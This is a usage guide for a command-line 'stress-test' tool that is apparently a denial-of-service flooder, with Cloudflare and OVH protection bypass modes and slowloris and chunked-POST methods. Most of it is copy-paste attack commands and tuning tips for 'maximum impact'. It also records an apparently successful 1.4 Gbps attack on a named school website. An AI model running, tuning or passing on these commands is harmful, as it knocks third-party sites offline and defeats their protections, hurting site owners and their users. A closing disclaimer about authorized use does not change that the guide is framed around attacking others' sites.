# 📖 EXECUTION GUIDE - STRESS TEST TOOL

## 1️⃣ EASIEST WAY (Copy-Paste)

Binary is ready at: `/workspaces/ragrag/target/release/stress-test`

### Open Terminal and Run:

```bash
cd /workspaces/ragrag
./target/release/stress-test --help
```

Complete help with all options will appear.

---

## 2️⃣ BASIC EXECUTION EXAMPLES

### A. Attack Website (No Bypass)
```bash
./target/release/stress-test --url https://example.com -c 100 -d 10
```

**Explanation:**
- `--url` = Target URL
- `-c 100` = 100 concurrent connections
- `-d 10` = Attack duration 10 seconds

### B. Attack with Cloudflare Bypass
```bash
./target/release/stress-test --url https://example.com -c 300 -d 20 -b cloudflare --randomize-ua -P
```

**Explanation:**
- `-b cloudflare` = Enable Cloudflare bypass mode
- `--randomize-ua` = Randomize User-Agent
- `-P` = Enable connection pooling (HTTP/2)

### C. Attack with Custom Payload Size
```bash
./target/release/stress-test --url https://example.com -c 200 -d 30 -p 2048 -m post-chunked -b cloudflare
```

**Explanation:**
- `-p 2048` = Payload size 2048 KB
- `-m post-chunked` = POST method with chunked encoding
- `-b cloudflare` = Bypass mode

---

## 3️⃣ COMPLETE PARAMETERS

```
./target/release/stress-test [OPTIONS]

OPTIONS:
  --url <URL>              Target URL (REQUIRED)
                           Example: https://www.example.com/

  -c, --connections <NUM>  Number of concurrent connections [default: 100]
                           Range: 1-10000
                           Recommended: 100-500

  -d, --duration <SEC>     Attack duration in seconds [default: 10]
                           Example: 60 for 1 minute

  -m, --method <METHOD>    Attack method [default: mixed]
                           Options:
                           • get-flood - HTTP GET requests
                           • post-chunked - Chunked POST
                           • range-request - HTTP Range headers
                           • pipeline - HTTP/1.1 pipelining
                           • slowloris - Slow header attack
                           • slow-post - Slow body send
                           • large-headers - Oversized headers
                           • conn-reuse - Keep-alive pooling
                           • mixed - Random method per request

  -p, --payload <KB>       Payload size in KB [default: 1024]
                           Range: 1-10000 KB
                           Recommended: 1024-3000

  -b, --bypass <MODE>      Bypass mode [default: generic]
                           Options:
                           • generic - Basic bypass
                           • cloudflare - Cloudflare specific
                           • ovh - OVH specific

  --randomize-ua           Randomize User-Agent per request
                           Flag: ON/OFF

  -P, --http2              Enable HTTP/2 & connection pooling
                           Flag: ON/OFF

  -r, --retries <NUM>      Retry count per request [default: 1]
                           Range: 1-10

  -h, --help               Show this help message
  -V, --version            Show version
```

---

## 4️⃣ REAL-WORLD EXAMPLE (CLOUDFLARE+LITESPEED)

### Target: https://www.smkn1-cmi.sch.id/

**Successful command (1457.92 Mbps):**
```bash
./target/release/stress-test \
  --url https://www.smkn1-cmi.sch.id/ \
  -c 300 \
  -d 20 \
  -m mixed \
  -p 2048 \
  -b cloudflare \
  --randomize-ua \
  -P
```

**Expected output:**
```
═══════════════════════════════════════════
  STRESS TEST RESULTS
═══════════════════════════════════════════
Total Requests: 3204
Successful: 3204 (100%)
Failed: 0
Total Data Sent: 5031 MB
Bandwidth: 1457.92 Mbps
Requests/sec: 116.04
Duration: 27.61s
═══════════════════════════════════════════
```

---

## 5️⃣ DIFFERENT EXECUTION STRATEGIES

### 🔴 LIGHT ATTACK (Testing/Reconnaissance)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 50 \
  -d 5 \
  -m get-flood
```
**Use for:** Testing availability, checking response

### 🟠 MODERATE ATTACK (Standard Stress)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 200 \
  -d 30 \
  -m mixed \
  -p 1024 \
  -b cloudflare \
  --randomize-ua
```
**Use for:** Standard stress testing, bandwidth check

### 🔴 HEAVY ATTACK (Maximum Impact)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 500 \
  -d 60 \
  -m post-chunked \
  -p 3000 \
  -b cloudflare \
  --randomize-ua \
  -P \
  -r 5
```
**Use for:** Maximum stress, bandwidth saturation

### 🟡 LONG-TERM ATTACK (Sustained)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 100 \
  -d 3600 \
  -m slowloris \
  -b cloudflare \
  --randomize-ua
```
**Use for:** Long duration stress (1 hour), connection draining

---

## 6️⃣ QUICK START COMMANDS

**Copy-paste directly into terminal:**

### Test 1: Check if binary works
```bash
cd /workspaces/ragrag && ./target/release/stress-test --help
```

### Test 2: Light attack on target
```bash
cd /workspaces/ragrag && ./target/release/stress-test --url https://example.com -c 100 -d 10 -b cloudflare --randomize-ua
```

### Test 3: Standard attack (like demo)
```bash
cd /workspaces/ragrag && ./target/release/stress-test --url https://www.smkn1-cmi.sch.id/ -c 300 -d 20 -m mixed -p 2048 -b cloudflare --randomize-ua -P
```

### Test 4: Maximum bandwidth attack
```bash
cd /workspaces/ragrag && ./target/release/stress-test --url https://example.com -c 800 -d 120 -m post-chunked -p 5000 -b cloudflare --randomize-ua -P
```

---

## 7️⃣ OUTPUT INTERPRETATION

```
═══════════════════════════════════════════
  STRESS TEST RESULTS
═══════════════════════════════════════════
Total Requests: 3204          ← Number of requests sent
Successful: 3204 (100%)       ← Successful requests
Failed: 0                     ← Failed requests
Total Data Sent: 5031 MB      ← Total data in MB
Bandwidth: 1457.92 Mbps       ← Bandwidth in Megabits/sec
Requests/sec: 116.04          ← Requests per second
Duration: 27.61s              ← Actual execution time
═══════════════════════════════════════════
```

### Interpretation:
- **Success Rate 100%** = Bypass working perfectly
- **Bandwidth > 1000 Mbps** = Attack very effective
- **RPS > 100** = Many requests processed per second
- **Failed = 0** = Nothing blocked

---

## 8️⃣ TROUBLESHOOTING

### ❌ "Permission denied"
```bash
chmod +x /workspaces/ragrag/target/release/stress-test
./target/release/stress-test --url https://example.com
```

### ❌ "Connection refused"
- Target might be offline
- Firewall blocking
- Try different target or wait

### ❌ "Too many open files"
```bash
ulimit -n 10000  # Increase file descriptor limit
./target/release/stress-test ...
```

### ❌ Empty output / hang
- Target might be too slow
- Try reducing `-c` (connections)
- Try different target

---

## 9️⃣ OPTIMIZATION TIPS

### For Cloudflare targets:
```bash
./target/release/stress-test \
  --url <URL> \
  -c 300-500 \
  -d 30-60 \
  -m mixed \
  -p 2048-3000 \
  -b cloudflare \
  --randomize-ua \
  -P
```

### For OVH targets:
```bash
./target/release/stress-test \
  --url <URL> \
  -c 200-400 \
  -d 30-60 \
  -m post-chunked \
  -p 2048 \
  -b ovh \
  --randomize-ua \
  -P
```

### For maximum bandwidth:
- Use `-m post-chunked`
- Increase `-p` to 3000-5000
- Increase `-c` to 500-1000
- Enable `-P` (HTTP/2)

---

## 🔟 COMPLETE WORKFLOW EXAMPLE

```bash
# 1. Navigate to folder
cd /workspaces/ragrag

# 2. View help
./target/release/stress-test --help

# 3. Test with light target
./target/release/stress-test --url https://example.com -c 100 -d 10

# 4. Test with Cloudflare bypass
./target/release/stress-test --url https://example.com -c 300 -d 20 -b cloudflare --randomize-ua -P

# 5. Full aggressive attack
./target/release/stress-test --url https://example.com -c 500 -d 60 -m post-chunked -p 3000 -b cloudflare --randomize-ua -P -r 5

# 6. Wait for results and view output
```

---

## 📝 NOTES

✅ Binary already compiled and ready to use
✅ No need to `cargo build` again
✅ All bypass techniques built-in
✅ HTTP/2 and connection pooling support
✅ Cross-platform compatible

⚠️ **DISCLAIMER:**
- Only use for authorized testing
- User is responsible for usage
- Illegal use may have legal consequences

---

**Version:** 3.0 Enhanced Cloudflare Bypass
**Status:** ✅ TESTED & WORKING
**Binary Size:** 4.7 MB
**Last Update:** November 17, 2025
